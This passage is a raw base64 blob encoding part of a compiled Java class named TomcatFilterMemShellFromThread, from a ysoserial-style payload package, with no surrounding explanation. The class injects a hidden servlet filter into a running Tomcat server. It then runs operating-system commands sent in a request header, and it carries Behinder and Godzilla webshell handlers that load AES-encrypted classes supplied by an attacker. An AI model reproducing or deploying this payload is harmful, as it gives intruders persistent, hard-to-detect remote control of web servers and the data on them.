AW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQBAA1TdGFja01hcFRhYmxlBwF+BwFzAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBAAJbQgEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcCEgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwITAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAKZ2V0UmVxdWVzdAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQALZ2V0UmVzcG9uc2UBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEABG5leHQBAAVFbnRyeQEADElubmVyQ2xhc3NlcwEAFUxqYXZhL3V0aWwvTWFwJEVudHJ5OwEACHBhcmFtS2V5AQAOcGFyYW1WYWx1ZUxpc3QBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAtyZWFsUmVxdWVzdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAEmNveW90ZVJlcXVlc3RGaWVsZAEADWNveW90ZVJlcXVlc3QBABtMb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdDsBAApwYXJhbWV0ZXJzAQAoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvaHR0cC9QYXJhbWV0ZXJzOwEAD3BhcmFtSGFzaFZhbHVlcwEACHBhcmFtTWFwAQAZTGphdmEvdXRpbC9MaW5rZWRIYXNoTWFwOwEAFExqYXZhL3V0aWwvSXRlcmF0b3I7AQALcGFnZUNvbnRleHQBABNMamF2YS91dGlsL0hhc2hNYXA7AQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQABawEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBAA5ldmlsY2xhc3NfYnl0ZQEACWV2aWxjbGFzcwEADnVybENsYXNzTG9hZGVyAQAZTGphdmEvbmV0L1VSTENsYXNzTG9hZGVyOwEACWRlZk1ldGhvZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAEZGF0YQEAC2xhc3RSZXF1ZXN0AQAMbGFzdFJlc3BvbnNlAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAUkxqYXZhL3V0aWwvTWFwJEVudHJ5PExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvU3RyaW5nOz47PjsBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL1N0cmluZzs+OwEAaExqYXZhL3V0aWwvSXRlcmF0b3I8TGphdmEvdXRpbC9NYXAkRW50cnk8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvdXRpbC9BcnJheUxpc3Q8TGphdmEvbGFuZy9TdHJpbmc7Pjs+Oz47BwKjBwIUBwIVBwIWBwGGBwGHBwF9BwIXBwD1BwGsBwIYBwIZBwG3BwG4BwIaBwG6BwIbBwHBBwHHBwIcAQABeAEAByhbQlopW0IBAAFaBwIdAQAHZGVzdHJveQEACDxjbGluaXQ+AQAEbmFtZQEAClVSTFBhdHRlcm4BABV3ZWJhcHBDbGFzc0xvYWRlckJhc2UBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEABmFDbGFzcwEAB0NvbmZpZ3MBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOYmVoaW5kZXJGaWx0ZXIBAAlmaWx0ZXJEZWYBADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7AQAJZmlsdGVyTWFwAQAxTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwOwEAC2NvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWc7AQA+TGphdmEvbGFuZy9DbGFzczwrTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7PjsHAfYHAfoHAXwBAApTb3VyY2VGaWxlAQAjVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkLmphdmEMAMEAwgEAEDNjNmUwYjhhOWMxNTIyNGEMALsAvAwAvQC8AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAh4CHwwCIAIhDAC+AMgMAL4AvAEAA01ENQcCIgwCIwIkDAIlAiYMAicCKAwCKQIqAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAisCJgwAwQIsDAIgAi0MAi4CIQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0DAIvAjABAApnZXRFbmNvZGVyDAIxAjIHAhcMAjMCNAwCNQI2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAjcCOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAHUmVmZXJlcgwCOQDIAQAXaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8MAjoCOwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUBACNqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0V3JhcHBlcgEALG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlRmFjYWRlAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2VXcmFwcGVyAQANeC1jbGllbnQtZGF0YQwCPAI9AQAHb3MubmFtZQcCPgwCPwDIDAJAAiEBAAN3aW4MAkECQgEAAi9jAQAJL2Jpbi9iYXNoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgcCQwwCRAJFDAJGAkcHAkgMAkkCSgwAwQJLAQACXEEMAkwCTQwA+AIhDAJOAk8HAlAMAlECUgEACHJlYmV5b25kDAIxAiEBAARQT1NUDAJTAlQBABFqYXZhL3V0aWwvSGFzaE1hcAwCVQJWDAJXAlgMAlkCWgcCWwwCXAIhAQAADAJdAl4HAhkMAl8CYAwCYQJiAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAEAGW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3QMAmMCZAEAF2phdmEvdXRpbC9MaW5rZWRIYXNoTWFwDAJlAmYHAmcMAOYCaAcCGwwCaQI9DAD4AjgBABNqYXZhL3V0aWwvTWFwJEVudHJ5DAJqAjgBAAEgAQABKwwCawJsDAJtAjgBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAJuAigBAAE9DAJhAm8BABBlNDVlMzI5ZmViNWQ5MjViAQABdQcCGAwCcAJxAQADQUVTBwIdDAIjAnIBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDADBAnMMAOoCdAEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzBwJ1DAJ2AMAMAncCMgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAYUA3AwCeAJ5BwJ6DAJ7AnwMAn0CfgwCfwKAAQAIZ29kemlsbGEMAoEAyAwA2wDcDAFBAUIMAL8AwAEAF2phdmEvbmV0L1VSTENsYXNzTG9hZGVyAQAMamF2YS9uZXQvVVJMDADBAoIBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwCgwKEDAKFAlIMAoYCJgwA0ADRDAKDAi0HAhYMAO8ChwEAD015RmlsdGVyVmVyc2lvbgwCiAKJDAIeAooBAAIvKgEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZQwCiwKMBwKNDAKOAo8BAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0DAKQAjYBAA1qYXZhL3V0aWwvTWFwAQA7eXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Ub21jYXRGaWx0ZXJNZW1TaGVsbEZyb21UaHJlYWQBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZgwCkQKSDAKTAlIMApQCIQwClQJSDAKWApcBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcAwCmAJSBwKZDAKaApsMAUcCIQwCnAJSDAKdAp4BADBvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWcBABtvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQMAp8CoAcCoQwCNwKiAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAmb3JnL2FwYWNoZS90b21jYXQvdXRpbC9odHRwL1BhcmFtZXRlcnMBABJqYXZhL3V0aWwvSXRlcmF0b3IBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQATamF2YXgvY3J5cHRvL0NpcGhlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBAAtnZXRJbnN0YW5jZQEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAhnZXRCeXRlcwEABCgpW0IBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1nZXRQYXJhbWV0ZXJzAQAqKClMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9odHRwL1BhcmFtZXRlcnM7AQAIZW50cnlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwEADWphdmEvdXRpbC9TZXQBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEABmdldEtleQEACnJlcGxhY2VBbGwBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldFZhbHVlAQAEc2l6ZQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACHB1dFZhbHVlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAAdkb0ZpbmFsAQAGKFtCKVtCAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEADGdldFBhcmFtZXRlcgEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQALdG9CeXRlQXJyYXkBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAIbmFub1RpbWUBAAMoKUoBABwoSilMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAMZ2V0UmVzb3VyY2VzAQAnKClMb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3Q7AQAjb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3QBAApnZXRDb250ZXh0AQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0OwEADWdldFN1cGVyY2xhc3MBAAlzZXRGaWx0ZXIBABkoTGphdmF4L3NlcnZsZXQvRmlsdGVyOylWAQANc2V0RmlsdGVyTmFtZQEAB2dldE5hbWUBAA5zZXRGaWx0ZXJDbGFzcwEADGFkZEZpbHRlckRlZgEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7KVYBAA1hZGRVUkxQYXR0ZXJuAQAcamF2YXgvc2Vy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